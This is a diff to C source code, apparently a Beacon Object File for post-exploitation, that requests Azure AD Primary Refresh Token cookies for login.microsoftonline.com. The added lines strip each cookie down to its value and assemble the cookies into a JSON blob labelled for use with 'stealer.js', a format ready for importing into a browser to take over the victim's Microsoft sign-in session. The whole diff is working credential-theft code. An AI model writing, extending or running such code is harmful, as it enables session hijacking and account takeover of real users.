@@ -4,7 +4,6 @@
 
 
 int requestaadprt(LPCWSTR nonce) {
-
 	LPCWSTR uri = L"https://login.microsoftonline.com/";
 	wchar_t * full_uri = NULL;
 	// We have a nonce, let's build the URL for it
@@ -57,20 +56,81 @@ int requestaadprt(LPCWSTR nonce) {
 		return 0;
 	}
 
+	// stealer.js JSON string prep
+	wchar_t* stealerPrefix = L"{\"url\":\"https://login.microsoftonline.com\",\"cookies\":[";
+	wchar_t* stealerSuffix = L"],\"local_storage\":[]}";
+	
+	size_t jsonSize = 0;
+	size_t capacity = 2048;
+	
+	wchar_t* jsonOutput = (wchar_t*)MSVCRT$malloc(capacity * sizeof(wchar_t));
+	if(jsonOutput == NULL){
+		internal_printf("Failed to initialize memory\n");
+		return 1;
+	}
+
+	MSVCRT$wcscpy(jsonOutput, stealerPrefix);
+	jsonSize = MSVCRT$wcslen(jsonOutput);
+
 	for (DWORD i = 0; i < cookieCount; i++) {
 		internal_printf("Name %ls\n", cookies[i].name);
 		internal_printf("Name: %ls\n", cookies[i].name);
 		internal_printf("Data: %ls\n", cookies[i].data);
 		internal_printf("Flags: %x\n", cookies[i].flags);
 		internal_printf("P3PHeader: %ls\n\n", cookies[i].p3pHeader);
+		
+		// truncate string to just the cookie value; other data appears to be static 60 chars
+		//   ; path=/; domain=login.microsoftonline.com; secure; httponly
+		size_t cookieValueLen = MSVCRT$wcslen(cookies[i].data);
+		if (cookieValueLen > 60) {
+			cookies[i].data[cookieValueLen - 60] = L'\0';
+		}
+
+		wchar_t* cookieJson = (wchar_t*)MSVCRT$malloc(2048 * sizeof(wchar_t));
+		
+		int written = MSVCRT$_snwprintf(
+			cookieJson,
+			2048,
+			L"{\"name\":\"%ls\",\"value\":\"%ls\",\"domain\":\"login.microsoftonline.com\",\"path\":\"/\",\"secure\":true,\"httpOnly\":true},",
+			cookies[i].name,
+			cookies[i].data
+		);
+		size_t chunkLen = MSVCRT$wcslen(cookieJson);
+
+		// check if we need to resize the JSON buffer
+		if (jsonSize + chunkLen + MSVCRT$wcslen(stealerSuffix) + 1 > capacity) {
+			capacity += 2048;
+			wchar_t* newOutput = (wchar_t*)MSVCRT$realloc(jsonOutput, capacity * sizeof(wchar_t));
+			if(newOutput == NULL){
+				internal_printf("Failed to initialize memory\n");
+				return 1;
+			}
+			jsonOutput = newOutput;
+		}
+		MSVCRT$wcscat(jsonOutput, cookieJson);
+		jsonSize += chunkLen;
+		MSVCRT$free(cookieJson);
 
 		OLE32$CoTaskMemFree(cookies[i].name);
 		OLE32$CoTaskMemFree(cookies[i].data);
 		OLE32$CoTaskMemFree(cookies[i].p3pHeader);
 	}
+
+	// remove trailing comma from JSON string, append suffix
+	if (jsonSize > 0 && jsonOutput[jsonSize - 1] == L',') {
+		jsonOutput[jsonSize - 1] = L'\0';
+		jsonSize--;
+	}
+	MSVCRT$wcscat(jsonOutput, stealerSuffix);
+
+	internal_printf("\nJSON cookie blob for use with stealer.js:\n");
+	printoutput(FALSE); // empty the buffer since the JSON string can get beefy
+	internal_printf("%ls\n\n", jsonOutput);
+	
+	MSVCRT$free(jsonOutput);
 	OLE32$CoTaskMemFree(cookies);
 	MSVCRT$free(full_uri);
-	
+
 	internal_printf("DONE\n");
 
 	return 0;
